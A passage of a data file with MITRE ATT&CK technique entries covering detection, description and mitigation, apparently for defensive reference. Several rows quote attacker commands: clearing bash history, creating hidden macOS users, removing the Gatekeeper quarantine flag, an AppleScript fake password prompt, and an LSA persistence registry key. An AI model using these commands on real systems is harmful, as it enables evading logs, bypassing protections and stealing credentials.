R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1026,['Multiband Communication'],https://attack.mitre.org/wiki/Technique/T1026
1479,['Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through [[Discovery]] techniques prior to attempting [[Lateral Movement]].'],[],['555'],[],['Authentication logs'],"['An adversary may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.']",[],[],[],"['Limit the number of accounts that may use remote services. Use multifactor authentication where possible. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs. Prevent [[Credential Access]] techniques that may allow an adversary to acquire [[Technique/T1078|Valid Accounts]] that can be used by existing services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Active remote service accepting connections and valid credentials'],[],['Lateral Movement'],Technique/T1021,['Remote Services'],https://attack.mitre.org/wiki/Technique/T1021
1480,['Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.'],[],[],[],"['File monitoring', 'Process monitoring', 'Process use of network']","['Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [[Technique/T1064|Scripting]] after being gathered during [[Collection]]. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [[Technique/T1041|Exfiltration Over Command and Control Channel]] and [[Technique/T1048|Exfiltration Over Alternative Protocol]].']",[],[],[],"['Identify unnecessary system utilities, scripts, or potentially malicious software that may be used to transfer data outside of a network, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1020,['Automated Exfiltration'],https://attack.mitre.org/wiki/Technique/T1020
1481,"['Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code> environment variable is also suspicious.']","['Log analysis', 'Host forensic analysis']",[],[],"['Process Monitoring', 'Authentication logs', 'File monitoring', 'Environment variable']","[u'The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.']",[],[],[],"[u'Prevent users from changing the <code>HISTCONTROL</code> environment variable[[CiteRef::Securing bash history]]. Also, make sure that the <code>HISTCONTROL</code> environment variable is set to \u201cignoredup\u201d instead of \u201cignoreboth\u201d or \u201cignorespace\u201d.']","['Linux', 'MacOS', 'OS X']",['User'],[],[],['Defense Evasion'],Technique/T1148,['HISTCONTROL'],https://attack.mitre.org/wiki/Technique/T1148
1482,"['Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted.[[CiteRef::Zhang 2013]] If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [[Technique/T1041|Exfiltration Over Command and Control Channel]] and [[Technique/T1048|Exfiltration Over Alternative Protocol]]']",[],[],[],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to encrypt files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1022,['Data Encrypted'],https://attack.mitre.org/wiki/Technique/T1022
1483,"[""User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the modification of the HISTFILE and HISTFILESIZE environment variables or the removal/clearing of the <code>~/.bash_history</code> file are indicators of suspicious activity.""]","['Log analysis', 'Host forensic analysis']",[],[],"['Authentication logs', 'File monitoring']","[""macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm ~/.bash_history</code>.""]",[],[],[],"['Preventing users from deleting or writing to certain files can stop adversaries from maliciously altering their <code>~/.bash_history</code> files. Additionally, making these environment variables readonly can make sure that the history is preserved [[CiteRef:: Securing bash history]].']","['Linux', 'MacOS', 'OS X']",['User'],[],[],['Defense Evasion'],Technique/T1146,['Clear Command History'],https://attack.mitre.org/wiki/Technique/T1146
1484,"['This technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.']",[],[],[],"['Authentication logs', 'File monitoring']","['Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in <code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [[Technique/T1136|Create Account]] technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code>[[CiteRef::Cybereason OSX Pirrit]].']",[],[],[],"['If the computer is domain joined, then group policy can help restrict the ability to create or hide users. Similarly, preventing the modification of the <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> value will force all users to be visible.']","['MacOS', 'OS X']","['Administrator', 'root']",[],[],['Defense Evasion'],Technique/T1147,['Hidden Users'],https://attack.mitre.org/wiki/Technique/T1147
1485,['Monitoring for the removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further.'],"['Application whitelisting', 'Anti-virus']",[],[],[],"[u""In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. \n\nApps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won\u2019t set this flag. Additionally, other utilities or events like drive-by downloads don\u2019t necessarily set it either. This completely bypasses the built-in Gatekeeper check[[CiteRef::Methods of Mac Malware Persistence]]. The presence of the quarantine flag can be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code> [[CiteRef::Clearing quarantine attribute]][[CiteRef::OceanLotus for OS X]].\n \nIn typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS\u2019s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the url where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application [[CiteRef::Bypassing Gatekeeper]].""]",[],[],[],"[""Other tools should be used to supplement Gatekeeper's functionality. Additionally, system settings can prevent applications from running that haven't been downloaded through the Apple Store which can help mitigate some of these issues.""]","['MacOS', 'OS X']","['User', 'Administrator']",[],[],['Defense Evasion'],Technique/T1144,['Gatekeeper Bypass'],https://attack.mitre.org/wiki/Technique/T1144
1486,['Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.'],[],[],"['Itzik Kotler, SafeBreach']",['File monitoring'],"['Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.[[CiteRef::Wikipedia Public Key Crypto]]\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [[Technique/T1021|Remote Services]] like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on *nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [[Technique/T1056|Input Capture]] for keylogging or attempt to [[Technique/T1110|Brute Force]] the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.[[CiteRef::Kaspersky Careto]][[CiteRef::Palo Alto Prince of Persia]]']",[],[],[],"['Use strong passphrases for private keys to make cracking difficult. When possible, store keys on separate cryptographic hardware instead of on the local system. Ensure only authorized keys are allowed access to critical resources and audit access lists regularly. Ensure permissions are properly set on folders containing sensitive private keys to prevent unintended access. Use separate infrastructure for managing critical systems to prevent overlap of credentials and permissions on systems that could be used as vectors for lateral movement. Follow other best practices for mitigating access through use of [[Technique/T1078|Valid Accounts]].']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Credential Access'],Technique/T1145,['Private Keys'],https://attack.mitre.org/wiki/Technique/T1145
1487,"['Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.']",[],[],[],"['System calls', 'Process Monitoring']","[u""Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.[[CiteRef::Wikipedia keychain]] The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.[[CiteRef::External to DA, the OS X Way]] By default, the passphrase for the keychain is the user\u2019s logon credentials.""]",[],[],[],"[""The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.""]","['MacOS', 'OS X']",['Administrator'],[],[],['Credential Access'],Technique/T1142,['Keychain'],https://attack.mitre.org/wiki/Technique/T1142
1488,"['Monitoring when the user\'s <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like ""history"" instead of commands like <code>cat ~/.bash_history</code>.']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","[u'Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user\u2019s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user\u2019s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials.[[CiteRef::External to DA, the OS X Way]]']",[],[],[],"[""There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:\n<code>set +o history</code> and <code>set -o history</code> to start logging again;\n<code>unset HISTFILE</code> being added to a user's .bash_rc file; and\n<code>ln -s /dev/null ~/.bash_history</code> to write commands to <code>/dev/null</code>instead.""]","['Linux', 'MacOS', 'OS X']",['User'],[],[],['Credential Access'],Technique/T1139,['Bash History'],https://attack.mitre.org/wiki/Technique/T1139
1489,"['Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [[Software/S0160|certutil]].']","['Anti-virus', 'Host intrusion prevention systems', 'Signature-based detection', 'Network intrusion detection system']",[],"['Matthew Demaske, Adaptforward']","['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['Adversaries may use [[Technique/T1027|Obfuscated Files or Information]] to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [[Technique/T1064|Scripting]], [[Technique/T1086|PowerShell]], or by using utilities present on the system.\n\nOne such example is use of [[Software/S0160|certutil]] to decode a remote access tool portable executable file that has been hidden inside a certificate file.[[CiteRef::Malwarebytes Targeted Attack against Saudi Arabia]]']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to deobfuscate or decode files or information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Defense Evasion'],Technique/T1140,['Deobfuscate/Decode Files or Information'],https://attack.mitre.org/wiki/Technique/T1140
1490,"[""This technique exploits users' tendencies to always supply credentials when prompted, which makes it very difficult to detect. Monitor process execution for unusual programs as well as AppleScript that could be used to prompt users for credentials.""]",[],[],[],"['User interface', 'Process Monitoring']","['When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:\n\n<code>set thePassword to the text returned of (display dialog ""AdobeUpdater needs permission to check for updates. Please authenticate."" default answer """")</code>\n[[CiteRef::OSX Keydnap malware]]\n\nAdversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.[[CiteRef::OSX Malware Exploits MacKeeper]]']",[],[],[],['Users need to be trained to know which programs ask for permission and why. Follow mitigation recommendations for [[Technique/T1155|AppleScript]].'],"['MacOS', 'OS X']",['User'],[],[],['Credential Access'],Technique/T1141,['Input Prompt'],https://attack.mitre.org/wiki/Technique/T1141
1491,"['Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]] \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute [[Software/S0106|cmd]] commands or scripts.\n\nLook for abnormal process call trees from known services and for execution of other commands that could relate to [[Discovery]] or other adversary techniques. Services may also be modified through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]], so additional logging may need to be configured to gather the appropriate data.']",[],['551'],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","[""Windows service configuration information, including the file path to the service's executable, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [[Software/S0075|Reg]].\n\nAdversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [[Technique/T1036|Masquerading]] that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.""]",[],[],[],['Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. Toolkits like the PowerSploit framework contain the PowerUp modules that can be used to explore systems for [[Privilege Escalation]] weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through service abuse by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1031,['Modify Existing Service'],https://attack.mitre.org/wiki/Technique/T1031
1492,['Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]'],[],[],[],"['DLL monitoring', 'Windows Registry', 'Loaded DLLs']","['Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.[[CiteRef::MSDN Authentication Packages]]\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>""Authentication Packages""=<target binary></code>. The binary will then be executed by the system when the authentication packages are loaded.']",[],[],[],"['Windows 8.1, Windows Server 2012 R2, and later versions, may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all DLLs loaded by LSA to be signed by Microsoft.[[CiteRef::Graeber 2014]][[CiteRef::Microsoft Configure LSA]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],['Persistence'],Technique/T1131,['Authentication Package'],https://attack.mitre.org/wiki/Technique/T1131
1493,"['SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]]\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Malware reverse engineering', 'Process use of network', 'Process monitoring', 'SSL/TLS inspection']","['Adversaries use command and control over an encrypted channel using a known encryption protocol like HTTPS or SSL/TLS. The use of strong encryption makes it difficult for defenders to detect signatures within adversary command and control traffic.\n\nSome adversaries may use other encryption protocols and algorithms with symmetric keys, such as RC4, that rely on encryption keys encoded into malware configuration files and not public key cryptography. Such keys may be obtained through malware reverse engineering.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1032,['Standard Cryptographic Protocol'],https://attack.mitre.org/wiki/Technique/T1032
1494,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['577'],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['===Windows===\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [[Technique/T1003|Credential Dumping]]. The information may be collected in a number of different ways using other [[Discovery]] techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs.\n\n===Mac===\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n===Linux===\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],['Discovery'],Technique/T1033,['System Owner/User Discovery'],https://attack.mitre.org/wiki/Technique/T1033
1495,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.'],[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1030,['Data Transfer Size Limits'],https://attack.mitre.org/wiki/Technique/T1030
1496,['There are several public tools available that will detect shims that are currently available[[CiteRef::Black Hat 2015 App Shim]]:\n\n* Shim-Process-Scanner - checks memory of every running process for any Shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.'],[],[],[],"['Loaded DLLs', 'System calls', 'Windows Registry', 'Process Monitoring', 'Process command-line parameters']","['The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow compatibility of programs as Windows updates and changes its code. For example, application shimming feature that allows programs that were created for Windows XP to work with Windows 10. Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses API hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [[Technique/T1088|Bypass User Account Control]] (UAC) (RedirectEXE), inject DLLs into processes (InjectDll), and intercept memory addresses (GetProcAddress). Utilizing these shims, an adversary can perform several malicious acts, such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.']",[],[],[],"['There currently aren\'t a lot of ways to mitigate application shimming. Disabling the Shim Engine isn\'t recommended because Windows depends on shimming for interoperability and software may become unstable or not work. Microsoft released an optional patch update - KB3045645 - that will remove the ""auto-elevate"" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC. \n\nChanging UAC settings to ""Always Notify"" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Execution', 'Persistence', 'Privilege Escalation']",Technique/T1138,['Application Shimming'],https://attack.mitre.org/wiki/Technique/T1138
1497,"[""Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the binary name on disk and the binary's resource section, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries could provide useful leads, but may not always be indicative of malicious activity.[[CiteRef::Endgame Masquerade Ball]]""]",['Whitelisting by file name or path'],[],['ENDGAME'],"['File monitoring', 'Process monitoring', 'Binary file metadata']","['Masquerading occurs when an executable, legitimate or malicious, is placed in a commonly trusted location (such as C:\\Windows\\System32) or named with a common name (such as ""explorer.exe"" or ""svchost.exe"") to bypass tools that trust executables by relying on file name or path. An adversary may even use a renamed copy of a legitimate utility, such as rundll32.exe.[[CiteRef::Endgame Masquerade Ball]] Masquerading also may be done to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.']",[],[],[],"['When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\\Windows\\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.\n\nIdentify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense 